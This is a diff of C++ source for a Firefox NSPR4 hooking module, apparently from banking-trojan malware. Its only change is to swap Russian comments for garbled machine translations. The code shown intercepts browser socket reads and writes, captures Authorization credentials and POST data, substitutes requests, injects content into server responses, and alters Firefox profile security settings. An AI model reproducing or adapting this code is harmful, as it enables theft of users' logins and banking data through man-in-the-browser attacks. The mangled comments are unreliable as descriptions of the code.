@@ -21,9 +21,9 @@
 
 #if(BO_NSPR4 > 0)
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
-// Некотрое подобие структур из NSPR4.
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
+//В Nekotrye like structures from NSPR4.
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 //PRFileDesc.
 typedef struct
@@ -46,8 +46,8 @@ typedef struct
 typedef struct
 {
   PRFILEDESC* fd;
-  __int16 in_flags;  //PR_POLL_*.
-  __int16 out_flags; //PR_POLL_*.
+  __int16 in_flags;  //PR_POLL_ *.
+  __int16 out_flags; //PR_POLL_ *.
 }PRPOLLDESC;
 
 //PRStatus
@@ -57,52 +57,52 @@ typedef enum
   PR_SUCCESS = 0
 }PRSTATUS;
 
-//Хэндл nspr4.dll
+//The handle nspr4.dll
 static HMODULE handle;
 
-//Функция создания сокета. 
+//Function to create the socket.
 typedef void *(__cdecl *PR_OPENTCPSOCKET)(int af);
 static PR_OPENTCPSOCKET prOpenTcpSocket;
 
-//Функция закрытия хэндлов.
+//Function handles the closing.
 typedef PRSTATUS (__cdecl *PR_CLOSE)(void *fd);
 static PR_CLOSE prClose;
 
-//Функция чтения.
+//Reading function.
 typedef int (__cdecl *PR_READ)(void *fd, void *buf, __int32 amount);
 static PR_READ prRead;
 
-//Функция записи.
+//Recording function.
 typedef int (__cdecl *PR_WRITE)(void *fd, const void *buf, __int32 amount);
 static PR_WRITE prWrite;
 
-//Получение типа сокета.
+//Getting the type of socket.
 typedef char *(__cdecl *PR_GETNAMEFORIDENTITY)(int ident);
 static PR_GETNAMEFORIDENTITY prGetNameForIdentity;
 
-//Установка ошибки.
+//Installation errors.
 typedef void (__cdecl *PR_SETERROR)(__int32 errorCode, __int32 oserr);
 static PR_SETERROR prSetError;
 
-//Получение ошибки.
+//Getting error.
 typedef __int32 (__cdecl *PR_GETERROR)(void);
 static PR_GETERROR prGetError;
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
-// Таблица соединений.
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
+//В Connection table.
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 typedef struct
 {
-  PRFILEDESC *fd;                        //Хэндл соединения.
-  LPSTR url;                             //Текущая URL. Заполнячться только для инжекта.
-  DWORD writeBytesToSkip;                //Количетсво байт которые нужно проигнорировать в PR_Write().
+  PRFILEDESC *fd;                        //The handle of the connection.
+  LPSTR url;                             //The current URL. Zapolnyachtsya for injection produce.
+  DWORD writeBytesToSkip;                //Kolichetsvo bytes to be ignored in PR_Write ().
 
-  HttpGrabber::INJECTFULLDATA *injects; //Список ижектов, применяемых для соединения.
-  DWORD injectsCount;                   //Кол. элементов в injects.
+  HttpGrabber::INJECTFULLDATA *injects; //List izhektov used for the connection.
+  DWORD injectsCount;                   //Count. elements in the injects.
 
-  LPBYTE response;                       //Буфер для накопления данных возращенных от сервера.
-  DWORD responseSize;                    //Размер response.
+  LPBYTE response;                       //Clipboard for accumulation of data returned by the server.
+  DWORD responseSize;                    //The size of response.
 
   struct
   {
@@ -110,14 +110,14 @@ typedef struct
     DWORD size;
     DWORD pos;
     DWORD realSize;
-  }pendingRequest; //Данные ожидаемые для отправки от каллера PR_Write().
+  }pendingRequest; //Data is expected to be sent from Callery PR_Write ().
 
   struct
   {
     void *buf;
     DWORD size;
     DWORD pos;
-  }pendingResponse; //Данные ожидаемые для отправки каллеру PR_Read().
+  }pendingResponse; //Data is expected to send Culler PR_Read ().
 }NSPR4CONNECTION;
 
 static NSPR4CONNECTION *connections;
@@ -149,7 +149,7 @@ static DWORD connectionAdd(const PRFILEDESC *fd)
   NSPR4CONNECTION *newConnection = NULL;
   DWORD index                    = (DWORD)-1;
   
-  //Ищим свободный.
+  //Ischim free.
   for(DWORD i = 0; i < connectionsCount; i++)if(connections[i].fd == NULL)
   {
     newConnection = &connections[i];
@@ -157,14 +157,14 @@ static DWORD connectionAdd(const PRFILEDESC *fd)
     break;
   }
   
-  //Добовляем новый.
+  //Dobovlyaem new.
   if(newConnection == NULL && Mem::reallocEx(&connections, sizeof(NSPR4CONNECTION) * (connectionsCount + 1)))
   {
     index         = connectionsCount++;
     newConnection = &connections[index];
   }
 
-  //Заполняем.
+  //Fill.
   if(newConnection != NULL)
   {
     newConnection->fd               = (PRFILEDESC *)fd;
@@ -198,7 +198,7 @@ static void connectionRemove(DWORD index)
   Mem::free(newConnection->pendingRequest.buf);
   Mem::free(newConnection->pendingResponse.buf);
   
-  //Оптимизация.
+  //Optimization.
   {
     DWORD newCount = connectionsCount;
     while(newCount > 0 && connections[newCount - 1].fd == NULL)newCount--;
@@ -215,7 +215,7 @@ static void connectionRemove(DWORD index)
   }
 }
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 /*
   Кэлбэк enumProfiles().
 
@@ -235,12 +235,12 @@ typedef bool (ENUMPROFILESPROC)(const LPWSTR path, void *param);
 */
 static void enumProfiles(ENUMPROFILESPROC proc, void *param)
 {
-  //Получем домашнию директорию.
+  //Get home directory.
   WCHAR firefoxHome[MAX_PATH];
   CSTR_GETW(firefoxPath, nspr4_firefox_home_path);
   if(CWA(shell32, SHGetFolderPathW)(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, firefoxHome) == S_OK && Fs::_pathCombine(firefoxHome, firefoxHome, firefoxPath))
   {
-    //Получаем список профилей.
+    //Get a list of profiles.
     WCHAR profilesFile[MAX_PATH];
     
     CSTR_GETW(profilesBaseName, nspr4_firefox_file_profiles);
@@ -256,7 +256,7 @@ static void enumProfiles(ENUMPROFILESPROC proc, void *param)
 
       for(BYTE i = 0; i < 250; i++)
       {
-        //Получаем данные текущего профиля.
+        //Obtain data on the current profile.
         if(Str::_sprintfW(section, sizeof(section) / sizeof(WCHAR), keyProfileIdFormat, i) < 1 ||
            (isRelative = CWA(kernel32, GetPrivateProfileIntW)(section, keyProfileRelative, (INT)(UINT)-1, profilesFile)) == (UINT)-1
           )break;
@@ -264,8 +264,8 @@ static void enumProfiles(ENUMPROFILESPROC proc, void *param)
         if(CWA(kernel32, GetPrivateProfileStringW)(section, keyProfilePath, NULL, profilePath, sizeof(profilePath) / sizeof(WCHAR), profilesFile) == 0)continue;
         Fs::_normalizeSlashes(profilePath);
         
-        //Вызываем кээлбэк.
-        if(isRelative == 1) //Именно жестоко 1, согласно коду firefox.
+        //Call keelbek.
+        if(isRelative == 1) //It is cruel 1, according to the code firefox.
         {
           WCHAR fullPath[MAX_PATH];
           if(Fs::_pathCombine(fullPath, firefoxHome, profilePath) && !proc(fullPath, param))break;
@@ -320,13 +320,13 @@ static bool enumProfilesForUserJs(const LPWSTR path, void *param)
   return true;
 }
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 void Nspr4Hook::init(const LPWSTR homePage)
 {
-  if(coreData.integrityLevel > Process::INTEGRITY_LOW && CWA(kernel32, GetModuleHandleW)(L"nspr4.dll") != NULL) //При текущей сборке firefox, данный способ приемлем.
+  if(coreData.integrityLevel > Process::INTEGRITY_LOW && CWA(kernel32, GetModuleHandleW)(L"nspr4.dll") != NULL) //At the current assembly firefox, this method is acceptable.
   {
-    //Вносим изменения безопасности.
+    //Making changes to security.
     if(homePage != NULL && *homePage != 0)
     {
       LPWSTR homePageSlashed = Str::_addSlashesExW(homePage, -1); 
@@ -388,7 +388,7 @@ void Nspr4Hook::updateAddresses(HMODULE moduleHandle, void *openTcpSocket, void 
   ::prGetError           = (PR_GETERROR)CWA(kernel32, GetProcAddress)(handle, "PR_GetError");
 }
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 /*
   Заполнение HttpGrabber::REQUESTDATA.
@@ -418,17 +418,17 @@ static DWORD fillRequestData(HttpGrabber::REQUESTDATA *requestData, const PRFILE
 
   Mem::_zero(requestData, sizeof(HttpGrabber::REQUESTDATA));
 
-  //Проверяем ключевые данные.
+  //Verify key data.
   if((version  = HttpTools::_getMimeHeader(data, dataSize, (LPSTR)HttpTools::GMH_REQUEST_HTTP_VERSION, &versionSize))  == NULL || Str::_CompareA(version, "HTTP/1.1", versionSize, 8) != 0 ||
      (uri      = HttpTools::_getMimeHeader(data, dataSize, (LPSTR)HttpTools::GMH_HTTP_URI,     &uriSize))      == NULL || uriSize == 0    ||
      (method   = HttpTools::_getMimeHeader(data, dataSize, (LPSTR)HttpTools::GMH_HTTP_METHOD,  &methodSize))   == NULL || methodSize == 0 ||
      (host     = HttpTools::_getMimeHeader(data, dataSize, "Host",                             &hostSize))     == NULL || hostSize == 0   ||
      (postData = HttpTools::_getMimeHeader(data, dataSize, (LPSTR)HttpTools::GMH_DATA,         &postDataSize)) == NULL)
   {
-    return (DWORD)-1; //Ошибка протокола.
+    return (DWORD)-1; //A protocol error.
   }
   
-  //Вычисляем сколько байт нужно пропустить, до начала слежения следующего запроса.
+  //Calculate how many bytes to skip, before tracking the next request.
   DWORD bytesToSkip = 0;
   if((tmp = HttpTools::_getMimeHeader(data, dataSize, "Content-Length", &tmpSize)) != NULL)
   {
@@ -448,7 +448,7 @@ static DWORD fillRequestData(HttpGrabber::REQUESTDATA *requestData, const PRFILE
   }
   else if(postDataSize != 0)
   {
-    //Длины нет, а POST-данные есть... Ошибка.
+    //Length there, and POST-data is ... Error.
     return (DWORD)-1;  
   }
 
@@ -456,7 +456,7 @@ static DWORD fillRequestData(HttpGrabber::REQUESTDATA *requestData, const PRFILE
   WDEBUG2(WDDT_INFO, "bytesToSkip=%i, postDataSize=%i", bytesToSkip, postDataSize);  
 #endif
 
-  //Теперь заполняем структуру нормально.
+  //Now fill the structure is normal.
   {
     requestData->flags = HttpGrabber::RDF_NSPR4; 
     
@@ -465,7 +465,7 @@ static DWORD fillRequestData(HttpGrabber::REQUESTDATA *requestData, const PRFILE
       LPSTR scheme     = "http://";
       DWORD schemeSize = 7;
 
-      //Определяем HTTPS.
+      //Define HTTPS.
       if(fd->identity > 0 && (scheme = prGetNameForIdentity(fd->identity)) != NULL && Mem::_compare(scheme, "NSS layer", 9) == 0)
       {
         scheme     = "https://";
@@ -479,11 +479,11 @@ static DWORD fillRequestData(HttpGrabber::REQUESTDATA *requestData, const PRFILE
       Mem::_copy(requestData->url, scheme, schemeSize);
       requestData->urlSize = schemeSize;
         
-      //Хост. Порт является частью хоста.
+      //Host. The port is part of the host.
       Mem::_copy(requestData->url + requestData->urlSize, host, hostSize);
       requestData->urlSize += hostSize;
 
-      //Слеш
+      //Slash
       if(*uri != '/')requestData->url[requestData->urlSize++] = '/';
 
        //URI.
@@ -493,7 +493,7 @@ static DWORD fillRequestData(HttpGrabber::REQUESTDATA *requestData, const PRFILE
       requestData->url[requestData->urlSize] = 0;
     }
 
-    //Реферер.
+    //Referrer.
     if((tmp = HttpTools::_getMimeHeader(data, dataSize, "Referer", &tmpSize)) != NULL && tmpSize > 0)
     {
       requestData->referer     = Str::_CopyExA(tmp, tmpSize);
@@ -518,7 +518,7 @@ static DWORD fillRequestData(HttpGrabber::REQUESTDATA *requestData, const PRFILE
       requestData->postDataSize = postDataSize;
     }
 
-    //Получаем данные авторизации.
+    //Obtain the authorization data.
     if((tmp = HttpTools::_getMimeHeader(data, dataSize, "Authorization", &tmpSize)) != NULL && tmpSize > 0)
     {
       if(!HttpTools::_parseAuthorization(tmp, tmpSize, &requestData->authorizationData.userName, &requestData->authorizationData.password))
@@ -527,11 +527,11 @@ static DWORD fillRequestData(HttpGrabber::REQUESTDATA *requestData, const PRFILE
       }
     }
     
-    //Текущая конфигурация.
+    //The current configuration.
     requestData->dynamicConfig = DynamicConfig::getCurrent();
     requestData->localConfig   = LocalConfig::getCurrent();
 
-    //Хэндл запроса. Признак, что запрос нужно обробатывать.
+    //Handle to the query. Indication that the request should obrobatyvat.
     requestData->handle = (void *)fd;
   }
   
@@ -564,30 +564,30 @@ static DWORD replacePostData(const void *originalRequest, DWORD originalRequestS
 
   if(header == NULL)
   {
-    //И че мы будим тут ща добволять Content-Length и Content-Encdoing чтоли? Зачем? В такую
-    //ситуацию че можно попасть?
+    //And then we wake Th schA dobvolyat Content-Length and Content-Encdoing chtoli? Why? In this
+    //Th situation can get?
 
     Mem::free(buf);
     return 0;
   }
   else
   {
-    //Данные до начала содержимого Content-Length.
+    //Data before the content Content-Length.
     DWORD beforeLen = (DWORD)((LPBYTE)header - (LPBYTE)originalRequest);
     Mem::_copy(buf, (LPBYTE)originalRequest, beforeLen);
     bufSize += beforeLen;
     
-    //Содержимое Content-Length.
+    //The contents of Content-Length.
     Mem::_copy(buf + bufSize, number, numberLen);
     bufSize += numberLen;
     
-    //Данные после содеримого Content-Length.    
+    //Data after soderimogo Content-Length.
     DWORD afterLen = originalRequestSize - (beforeLen + headerSize);
     Mem::_copy(buf + bufSize, header + headerSize, afterLen);
     bufSize += afterLen;
   }
 
-  //Подменяем новые POST-данные.
+  //Substitute new POST-data.
   if((header = HttpTools::_getMimeHeader(buf, bufSize, (LPSTR)HttpTools::GMH_DATA, &headerSize)) == NULL)
   {
     Mem::free(buf);
@@ -601,25 +601,25 @@ static DWORD replacePostData(const void *originalRequest, DWORD originalRequestS
   return bufSize;
 }
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
-// Анализ HTTP.
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
+//В Analysis of HTTP.
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 
-//Флаги HTTPREQUESTINFO.flags.
+//Flags HTTPREQUESTINFO.flags.
 enum
 {
-  HRIF_DEFINED_CLOSE   = 0x1, //Соединение закрывается после отпарвки ответа.
-  HRIF_DEFINED_CHUNKED = 0x2, //Контент идет в формате chunked.
-  HRIF_DEFINED_LENGTH  = 0x4  //Размер контента известен.
+  HRIF_DEFINED_CLOSE   = 0x1, //The connection is closed after otparvki response.
+  HRIF_DEFINED_CHUNKED = 0x2, //The content is formatted chunked.
+  HRIF_DEFINED_LENGTH  = 0x4  //The size of the content is known.
 };
 
-//Информация о запросе.
+//Information on request.
 typedef struct
 {
-  DWORD flags;         //Флаги HRIF_*.
-  DWORD contentLength; //Размер контента.
-  DWORD contentOffset; //Позиция контента от начала запроса.
-  DWORD contentEndOffset; //Позиция конца конетнта (идекс байта уже не пренадлежащего запросу.)
+  DWORD flags;         //Flags HRIF_ *.
+  DWORD contentLength; //The size of the content.
+  DWORD contentOffset; //The position of the content from the beginning of the query.
+  DWORD contentEndOffset; //Position the end konetnta (IDEX bytes longer prenadlezhaschego request.)
 }HTTPREQUESTINFO;
 
 /*
@@ -651,7 +651,7 @@ static int analizeHttpResponse(HTTPREQUESTINFO *info, const void *request, DWORD
   LPSTR header;
   DWORD headerSize;
 
-  //Версия.
+  //Version.
   header = HttpTools::_getMimeHeader(request, requestSize, (LPSTR)HttpTools::GMH_RESPONSE_HTTP_VERSION, &headerSize);
   if(header == NULL || headerSize != 8 || Str::_CompareA("HTTP/1.", header, 7, 7) != 0)
   {
@@ -663,12 +663,12 @@ static int analizeHttpResponse(HTTPREQUESTINFO *info, const void *request, DWORD
     return -1;
   }
 
-  //Код.
+  //Code.
   header = HttpTools::_getMimeHeader(request, requestSize, (LPSTR)HttpTools::GMH_RESPONSE_STATUS, &headerSize);
   if(header == NULL || headerSize != 3 || !(header[0] == '2' && header[1] == '0' && header[2] == '0'))
   {
 #   if defined WDEBUG0
-    //WDEBUG0(WDDT_ERROR, "Bad response status.");
+    //WDEBUG0 (WDDT_ERROR, "Bad response status.");
 #   endif
     return -1;
   }
@@ -708,7 +708,7 @@ static int analizeHttpResponse(HTTPREQUESTINFO *info, const void *request, DWORD
 
   //Connection: close
   if(((header = HttpTools::_getMimeHeader(request, requestSize, "Connection", &headerSize)) != NULL && headerSize == 5 && Str::_CompareA("close", header, 5, 5) == 0) ||
-  //Proxy-Connection: close, не уверен что в этом есть смысл.  
+  //Proxy-Connection: close, not sure if this makes sense.
     (header = HttpTools::_getMimeHeader(request, requestSize, "Proxy-Connection", &headerSize)) != NULL && headerSize == 5 && Str::_CompareA("close", header, 5, 5) == 0)
   {
     info->flags |= HRIF_DEFINED_CLOSE;
@@ -744,7 +744,7 @@ static int analizeHttpResponseBody(HTTPREQUESTINFO *info, const LPBYTE buffer, D
   DWORD curSize = bufferSize - info->contentOffset;
   if(info->flags & HRIF_DEFINED_LENGTH)
   {
-    //Не получены все байты контента.
+    //Not received all the bytes of content.
 #   if defined WDEBUG2
     WDEBUG2(WDDT_INFO, "HRIF_DEFINED_LENGTH, curSize=%u, info->contentLength=%u.", curSize, info->contentLength);
 #   endif
@@ -770,34 +770,34 @@ static int analizeHttpResponseBody(HTTPREQUESTINFO *info, const LPBYTE buffer, D
       void *chunkData;
       DWORD chunkDataSize;
       
-      if(nextChunk == end || (Mem::_findData(nextChunk, (end - nextChunk), "\r\n", 2) == NULL && Mem::_findData(nextChunk, (end - nextChunk), "\n", 1) == NULL))//FIXME: Лень/усталость.
+      if(nextChunk == end || (Mem::_findData(nextChunk, (end - nextChunk), "\r\n", 2) == NULL && Mem::_findData(nextChunk, (end - nextChunk), "\n", 1) == NULL))//FIXME: Too lazy / tired.
       {
         retVal = 0;
-        break; //Не получен контент полностью.
+        break; //Not obtained completely content.
       }
       
       if((nextChunk = HttpTools::_readChunkedData(nextChunk, (end - nextChunk), &chunkData, &chunkDataSize)) == NULL)
       {
         retVal = -1;
-        break; //Ошибка чтениния, игнарируем запрос.
+        break; //Error chteniniya, ignariruem request.
       }
 
       if(chunkData == NULL)
       {
         retVal = 0;
-        break; //Не получен контент полностью.
+        break; //Not obtained completely content.
       }
 
       if(chunkDataSize == 0)
       {
         retVal = 1;
-        break; //Контент прочитан.
+        break; //Content is read.
       }
 
       if(!Mem::reallocEx(&contentBuffer, contentBufferSize + chunkDataSize))
       {
         retVal = -1;
-        break; //Не достатчоно памяти.
+        break; //Not dostatchono memory.
       }
 
       Mem::_copy(contentBuffer + contentBufferSize, chunkData, chunkDataSize);
@@ -832,7 +832,7 @@ static int analizeHttpResponseBody(HTTPREQUESTINFO *info, const LPBYTE buffer, D
   return 1;
 }
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 void *__cdecl Nspr4Hook::hookerPrOpenTcpSocket(int af)
 {
@@ -843,7 +843,7 @@ void *__cdecl Nspr4Hook::hookerPrOpenTcpSocket(int af)
   void *fd = prOpenTcpSocket(af);
   if(fd != NULL && Core::isActive())
   {
-    //FIXME: создавтаь только для нееблокируемыз сокетов.
+    //FIXME: sozdavta only neeblokiruemyz sockets.
     CWA(kernel32, EnterCriticalSection)(&connectionsCs); 
     connectionAdd((PRFILEDESC *)fd);
     CWA(kernel32, LeaveCriticalSection)(&connectionsCs);
@@ -893,7 +893,7 @@ __int32 __cdecl Nspr4Hook::hookerPrRead(void *fd, void *buf, __int32 amount)
     {
       NSPR4CONNECTION *nc = &connections[connectionIndex];
 
-      //Доотправляем байты.
+      //Dootpravlyaem bytes.
       if(nc->pendingResponse.size > 0)
       {
 sendPendingData:
@@ -906,7 +906,7 @@ sendPendingData:
         Mem::_copy(buf, (LPBYTE)nc->pendingResponse.buf + nc->pendingResponse.pos, size);
         nc->pendingResponse.pos += size;
 
-        //Буфер пуст.
+        //Buffer is empty.
         if(nc->pendingResponse.pos == nc->pendingResponse.size)
         {
           Mem::free(nc->pendingResponse.buf);
@@ -919,7 +919,7 @@ sendPendingData:
         return size;
       }
         
-      //Читаем ответ самсотоятельно, если есть инжекты на эту страницу.
+      //Read the answer samsotoyatelno if there is injected into the page.
       if(nc->injectsCount > 0)//FIXME: pipeline.
       {
 #       if defined WDEBUG0
@@ -949,7 +949,7 @@ sendPendingData:
           {
             nc = &connections[connectionIndex];
 
-            //Обновляем буфер.
+            //Update the buffer.
             if(readed > 0)
             {
               Mem::_copy(nc->response + nc->responseSize, buf, readed);
@@ -959,7 +959,7 @@ sendPendingData:
 #             endif
             }
 
-            //Анализируем заглоловок.
+            //Analyse zaglolovok.
             int analizeResult;
             {
               HTTPREQUESTINFO info;
@@ -977,7 +977,7 @@ sendPendingData:
 #                 if defined WDEBUG1
                   WDEBUG1(WDDT_INFO, "Injects accepted, contentSize=%u.", contentSize);
 #                 endif                  
-                  //Переоормляем результат.
+                  //Pereoormlyaem result.
                   LPBYTE newResponse = (LPBYTE)Mem::alloc(nc->responseSize - (info.contentEndOffset - info.contentOffset) + contentSize
                                                           + 11 + 2 + 2/*Content-Length, chunk*/
                                                           + 1 + 2 + 2/*final chunk*/);
@@ -1001,7 +1001,7 @@ sendPendingData:
                       p  = (LPBYTE)Mem::_copy2(p, content, contentSize);
                     }
 
-                    //Постфикс, параноя.
+                    //Postfix paranoia.
                     if(info.contentEndOffset != nc->responseSize)
                     {
 #                     if defined WDEBUG1
@@ -1011,7 +1011,7 @@ sendPendingData:
                       p = (LPBYTE)Mem::_copy2(p, nc->response + info.contentEndOffset, nc->responseSize - info.contentEndOffset);
                     }
                     
-                    //Подменяем контент.
+                    //Substitute for content.
                     Mem::free(nc->response);
                     nc->response     = newResponse;
                     nc->responseSize = (DWORD)(p - newResponse);
@@ -1026,7 +1026,7 @@ sendPendingData:
               }
             }
 
-            //Заголовок еще не прочитан.
+            //Title not read.
             if(readed > 0 && analizeResult == 0)
             {
 #             if defined WDEBUG0
@@ -1036,7 +1036,7 @@ sendPendingData:
               prSetError(-5998L/*PR_WOULD_BLOCK_ERROR*/, 0);
               readed = -1;
             }            
-            //Анализ завершен для текущего запроса.
+            //Analysis completed for the current request.
             else if(readed == 0 || analizeResult == -1)
             {
 #             if defined WDEBUG2
@@ -1087,8 +1087,8 @@ __int32 __cdecl Nspr4Hook::hookerPrWrite(void *fd, const void *buf, __int32 amou
       WDEBUG1(WDDT_INFO, "Connection 0x%p founded in table.", fd);
 #     endif
       
-      //Отылка помденненых данных вмест ооригинальных, которые не были отправлены при превром вызове PR_Write().
-      //Данный алгоритм корректен для блокируемых сокетов.
+      //Otylka pomdennenyh data instead ooriginalnyh that were not sent the call to transformation PR_Write ().
+      //This algorithm is correct for blocking sockets.
       if(nc->pendingRequest.size > 0)
       {
 sendPendingData:
@@ -1108,7 +1108,7 @@ sendPendingData:
           WDEBUG1(WDDT_INFO, "Writed %i bytes of pending data.", count);
 #         endif
 
-          //Сохраняем изменения.
+          //Save the changes.
           CWA(kernel32, EnterCriticalSection)(&connectionsCs);
           if((connectionIndex = connectionFind((PRFILEDESC *)fd)) == (DWORD)-1)
           {
@@ -1123,7 +1123,7 @@ sendPendingData:
           {
             nc = &connections[connectionIndex];
 
-            //Все отправлено.
+            //All sent.
             if(count == size)
             {
               count = nc->pendingRequest.realSize;
@@ -1135,11 +1135,11 @@ sendPendingData:
 
               Mem::_zero(&nc->pendingRequest, sizeof(nc->pendingRequest));
             }
-            //Отправлено частично.
+            //Posted partially.
             else
             {
               nc->pendingRequest.pos += count;
-              nc->pendingRequest.realSize--; //Как сделать еше, хз.
+              nc->pendingRequest.realSize--; //How to Make More, xs.
               count = 1;
 
 #             if defined WDEBUG2
@@ -1156,8 +1156,8 @@ sendPendingData:
         return count;
       }
 
-      //Проверяем сколько байт нужно пропустить от старого запроса.
-      //Данный алгоритм корректен для блокируемых сокетов, т.к. сюда из них попасть нельзя.
+      //Check how many bytes to skip from the old query.
+      //This algorithm is correct for blocking sockets, as here one can get.
       if(nc->writeBytesToSkip > 0)
       {
 sendSkippedData:
@@ -1175,7 +1175,7 @@ sendSkippedData:
           WDEBUG1(WDDT_INFO, "Writed %i bytes of skipped bytes.", count);
 #         endif
 
-          //Сохраняем изменения.
+          //Save the changes.
           CWA(kernel32, EnterCriticalSection)(&connectionsCs);
           if((connectionIndex = connectionFind((PRFILEDESC *)fd)) == (DWORD)-1)
           {
@@ -1200,7 +1200,7 @@ sendSkippedData:
             }
             else
             {
-              //Т.е. если запросы будут отправлдяется одновремнно один за другим, мы нагнемся раком.
+              //Ie if the requests are otpravldyaetsya odnovremnno one after the other, we stoop down with cancer.
               connectionRemove(connectionIndex);
 
 #             if defined WDEBUG3
@@ -1217,10 +1217,10 @@ sendSkippedData:
         return count;
       }
 
-      //Это новый запрос.
+      //This new request.
       {
-        //Получаем данные запроса. Firefox всегда отсылает за раз полный набор HTTP-заголовков, поэтому
-        //накоплением данных заниматься не нужно.
+        //Obtain the data query. Firefox always sends at a time, a complete set of HTTP-headers, so
+        //accumulation data do not need it.
         HttpGrabber::REQUESTDATA requestData;
         DWORD result = fillRequestData(&requestData, (PRFILEDESC *)fd, buf, amount);
 
@@ -1228,7 +1228,7 @@ sendSkippedData:
         WDEBUG1(WDDT_INFO, "New request detected, fillRequestData()=%u.",result);
 #       endif        
 
-        //Запрос некорректный, игнарируем соединение.
+        //Request invalid, ignariruem connection.
         if(result == (DWORD)-1)
         {
           connectionRemove(connectionIndex);
@@ -1239,14 +1239,14 @@ sendSkippedData:
         }
         else 
         {
-          //Запрос корректный, но он нам не интересен.
+          //Request more correct, but it is not interesting to us.
           if(requestData.handle == NULL)
           {
 #           if defined WDEBUG0
             WDEBUG0(WDDT_INFO, "Request skipped.");
 #           endif
           }
-          //Запрос корректен, отправляем на анализ.
+          //Query is correct, we send for analysis.
           else
           {
             DWORD analizeResult = HttpGrabber::analizeRequestData(&requestData);
@@ -1271,8 +1271,8 @@ sendSkippedData:
                 }
                 else
                 {
-                  //FIXME: Pipeline, т.е. тупо  nc->injects делаем массивом.
-                  //Старые инжекты могу сущестовать.
+                  //FIXME: Pipeline, ie stupidly nc-> injects make an array.
+                  //Old injected can suschestovat.
                   HttpGrabber::_freeInjectFullDataList(nc->injects, nc->injectsCount);
                   Mem::free(nc->response);
 
@@ -1288,11 +1288,11 @@ sendSkippedData:
                   nc->response     = NULL;
                   nc->responseSize = 0;
 
-                  //Удаляем заголовки.
+                  //Remove the headlines.
                   newRequestSize = amount;                    
-                  newRequestSize = HttpTools::_modifyMimeHeader(newRequest, newRequestSize, "Accept-Encoding", "identity");//FIXME: добавить, если не сущетвует.
+                  newRequestSize = HttpTools::_modifyMimeHeader(newRequest, newRequestSize, "Accept-Encoding", "identity");//FIXME: add, if not suschetvuet.
                   newRequestSize = HttpTools::_removeMimeHeader(newRequest, newRequestSize, "TE");
-                  newRequestSize = HttpTools::_removeMimeHeader(newRequest, newRequestSize, "If-Modified-Since"); //Избавляемся чтением из кеша.
+                  newRequestSize = HttpTools::_removeMimeHeader(newRequest, newRequestSize, "If-Modified-Since"); //Get rid reading from the cache.
                 }
               }
 
@@ -1336,7 +1336,7 @@ sendSkippedData:
                 }
               }
 
-              //Подменяем запрос. запрос самостоятельно.
+              //Substitute request. request itself.
               if(newRequest != NULL)
               {
                 HttpGrabber::_freeRequestData(&requestData);
